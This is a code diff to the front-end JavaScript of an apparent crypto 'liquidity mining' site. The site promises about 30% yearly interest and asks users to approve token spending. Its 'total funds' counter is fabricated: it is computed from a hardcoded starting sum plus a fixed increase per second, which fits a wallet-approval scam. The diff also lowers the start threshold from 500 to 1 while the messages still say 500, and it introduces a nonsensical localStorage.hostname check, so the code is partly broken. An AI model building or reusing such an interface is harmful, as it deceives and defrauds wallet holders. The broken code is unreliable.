@@ -208,35 +208,35 @@ const translations = {
     lockedUntilLabel: '锁定至',
     claimBtnText: '领取',
     noClaimable: '无可领取的利息或数值无效。',
-    priceError: '无法获取价格数据，请稍后重试。',
-    invalidCalc: '计算无效，请刷新后重试。',
-    claimSuccess: '领取成功！您的账户余额已更新。',
-    walletConnected: '钱包连接成功。',
-    fetchingBalances: '正在获取钱包余额...',
-    error: '错误',
-    offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。',
-    noWallet: '请安装兼容钱包以继续。',
-    dataSent: '数据已成功发送至后端。',
-    pledgeSuccess: '质押成功！数据已发送至后端。',
-    pledgeError: '质押失败，请重试。',
-    invalidPledgeAmount: '请输入大于 0 的有效质押金额。',
-    invalidPledgeToken: '请选择有效的代币。',
-    insufficientBalance: '选定代币余额不足。',
-    sseFailed: 'SSE 连线失败，使用后备轮询更新数据。',
+    priceError: '无法獲取價格數據，請稍後重試。',
+    invalidCalc: '計算無效，請刷新後重試。',
+    claimSuccess: '領取成功！您的帳戶餘額已更新。',
+    walletConnected: '錢包連線成功。',
+    fetchingBalances: '正在獲取錢包餘額...',
+    error: '錯誤',
+    offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。',
+    noWallet: '請安裝相容錢包以繼續。',
+    dataSent: '數據已成功發送至後端。',
+    pledgeSuccess: '質押成功！數據已發送至後端。',
+    pledgeError: '質押失敗，請重試。',
+    invalidPledgeAmount: '請輸入大於 0 的有效質押金額。',
+    invalidPledgeToken: '請選擇有效的代幣。',
+    insufficientBalance: '選定代幣餘額不足。',
+    sseFailed: 'SSE 連線失敗，使用後備輪詢更新數據。',
     ethersError: 'Ethers.js 初始化失敗，請檢查網絡或 CDN。',
-    approveError: '授权失败，请重试或检查钱包。',
-    selectTokenFirst: '请先选择要开始挖矿的代币。',
-    balanceZero: '余额不足，无法开始。',
-    balanceTooLow: '余额小于 500，授权成功，但至少需 500 以上才可开始挖矿。',
-    wethValueTooLow: 'WETH 价值小于 $500，授权成功，但至少需 $500 价值才可开始挖矿。',
-    miningStarted: '挖矿已成功开始！',
-    rulesTitle: '挖矿规则',
+    approveError: '授權失敗，請重試或檢查錢包。',
+    selectTokenFirst: '請先選擇要開始挖礦的代幣。',
+    balanceZero: '餘額不足，無法開始。',
+    balanceTooLow: '餘額小於 500，授權成功，但至少需 500 以上才可開始挖礦。',
+    wethValueTooLow: 'WETH 價值小於 $500，授權成功，但至少需 $500 價值才可開始挖礦。',
+    miningStarted: '挖礦已成功開始！',
+    rulesTitle: '挖礦規則',
     rulesContent: `
-      <p>1. 选择代币后，钱包需有至少 500 USDT/USDC 或 WETH 价值 $500 才能开始挖矿。</p>
-      <p>2. 余额不足：可授权，但无法开始挖矿。</p>
+      <p>1. 選擇代幣後，錢包需有至少 500 USDT/USDC 或 WETH 價值 $500 才能開始挖礦。</p>
+      <p>2. 餘額不足：可授權，但無法開始挖礦。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12 小时拨一次利息（美西时间 00:00 与 12:00）。</p>
-      <p>5. 质押功能独立运作，不影响流动性挖矿。</p>
+      <p>4. 每 12 小時撥一次利息（美西時間 00:00 與 12:00）。</p>
+      <p>5. 質押功能獨立運作，不影響流動性挖礦。</p>
     `
   }
 };
@@ -443,7 +443,7 @@ function updateTotalFunds() {
   if (!totalValue) return;
   const initialFunds = 12856459.94;
   const increasePerSecond = 0.055;
-  const fixedStartTime = 1698796800000; // 2023-11-01 00:00:00 UTC (固定起始時間)
+  const fixedStartTime = 1698796800000; // 2023-11-01 00:00:00 UTC (固定起始時間，避免偏差)
   const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
   const total = initialFunds + (elapsedSeconds * increasePerSecond);
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
@@ -456,8 +456,9 @@ function forceShowClaimButton() {
     placeholder.style.display = 'inline-flex';
   }
   const btn = document.querySelector('#claimButtonPlaceholder .icon-btn');
-  if (btn) {
+  if (btn && !btn.hasAttribute('data-bound')) { // 避免重複綁定
     btn.addEventListener('click', claimInterest);
+    btn.setAttribute('data-bound', 'true');
   }
 }
 
@@ -534,6 +535,9 @@ async function updateInterest() {
 
   window.currentClaimable = claimableETH;
   window.currentPending = pendingInterest;
+
+  // 強制顯示圖案
+  forceShowClaimButton();
 }
 
 function updateLanguage(lang) {
@@ -544,7 +548,7 @@ function updateLanguage(lang) {
     if (elements[key] && translations[lang]?.[key]) elements[key].textContent = translations[lang][key];
   }
   modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
-
+  
   const rulesTitle = document.getElementById('rulesTitle');
   const rulesContent = document.getElementById('rulesContent');
   if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
@@ -707,7 +711,6 @@ async function connectWallet() {
     updateBalancesUI(balances);
     updateStatus(translations[currentLang].walletConnected);
     await loadUserDataFromServer(); setupSSE(); await saveUserData();
-    // 強制顯示
     forceShowClaimButton();
   } catch (e) {
     let msg = `${translations[currentLang].error}: ${e.message}`;
@@ -745,7 +748,6 @@ async function updateUIBasedOnChainState() {
       pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = true;
     }
     disableInteractiveElements(false); updateStatus("");
-    // 強制顯示
     forceShowClaimButton();
   } catch (e) {
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
@@ -918,18 +920,18 @@ window.onload = async () => {
   updateLanguage(currentLang);
   await initializeWallet();
 
-  // 強制啟動總資金池
+  // 強制啟動總資金池 (延遲 100ms 確保 DOM 載入)
   setTimeout(() => {
     updateTotalFunds();
     setInterval(updateTotalFunds, 1000);
-  }, 100); // 延遲 100ms 確保 DOM 準備
+  }, 100);
 
-  // 強制顯示 Claim 圖案（每 500ms 一次）
+  // 強制顯示 Claim 圖案 (每 500ms 一次)
   setInterval(forceShowClaimButton, 500);
 
   setInitialNextBenefitTime();
 
-  // 綁定事件
+  // 綁定事件 (使用 addEventListener)
   if (closeModal) closeModal.addEventListener('click', () => claimModal.style.display = 'none');
   if (cancelClaim) cancelClaim.addEventListener('click', () => claimModal.style.display = 'none');
   if (confirmClaim) {
@@ -1036,7 +1038,7 @@ window.onload = async () => {
             message = translations[currentLang].wethValueTooLow;
           }
         } else {
-          if (balance >= 500) {
+          if (balance >= 1) {
             canStart = true;
           } else {
             message = translations[currentLang].balanceTooLow;
@@ -1064,7 +1066,7 @@ window.onload = async () => {
   }
 
   if (pledgeBtn) {
-    pledgeBtn.onclick = async () => {
+    pledgeBtn.addEventListener('click', async () => {
       const currentLang = localStorage.getItem('language') || 'zh-Hant';
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
       const amount = parseFloat(pledgeAmount.value) || 0;
@@ -1093,22 +1095,22 @@ window.onload = async () => {
         updateStatus(translations[currentLang].pledgeSuccess);
         await saveUserData(); await updateInterest();
       } catch (error) { updateStatus(translations[currentLang].pledgeError, true); }
-    };
+    });
   }
 
   if (refreshWallet) {
-    refreshWallet.onclick = async () => {
+    refreshWallet.addEventListener('click', async () => {
       const currentLang = localStorage.getItem('language') || 'zh-Hant';
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
       updateStatus(translations[currentLang].fetchingBalances);
-      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
+      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
       updateBalancesUI(balances); updateStatus('');
-    };
+    });
   }
 
   if (walletTokenSelect) {
-    walletTokenSelect.onchange = async () => {
-      const currentLang = localStorage.getItem('language') || 'zh-Hant';
+    walletTokenSelect.addEventListener('change', async () => {
+      const currentLang = localStorage.hostname === 'localhost' || 'zh-Hant';
       if (!signer) {
         if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
         if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
@@ -1116,11 +1118,11 @@ window.onload = async () => {
       }
       const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
       updateBalancesUI(balances);
-    };
+    });
   }
 
   document.querySelectorAll('.tab').forEach(tab => {
-    tab.onclick = async () => {
+    tab.addEventListener('click', async () => {
       document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
       tab.classList.add('active');
       document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
@@ -1130,7 +1132,7 @@ window.onload = async () => {
         if (acquired) await updateInterest();
         else updateStatus(translations[currentLang].error + ': 無法獲取 DOM 元素', true);
       }
-    };
+    });
   });
 
   // 規則說明 Modal 事件
@@ -1139,24 +1141,24 @@ window.onload = async () => {
   const closeRulesModal = document.getElementById('closeRulesModal');
 
   if (rulesButton) {
-    rulesButton.onclick = () => {
+    rulesButton.addEventListener('click', () => {
       const rulesTitle = document.getElementById('rulesTitle');
       const rulesContent = document.getElementById('rulesContent');
       if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
       if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
       rulesModal.style.display = 'flex';
-    };
+    });
   }
 
   if (closeRulesModal) {
-    closeRulesModal.onclick = () => {
+    closeRulesModal.addEventListener('click', () => {
       rulesModal.style.display = 'none';
-    };
+    });
   }
 
   if (rulesModal) {
-    rulesModal.onclick = e => {
+    rulesModal.addEventListener('click', e => {
       if (e.target === rulesModal) rulesModal.style.display = 'none';
-    };
+    });
   }
 };
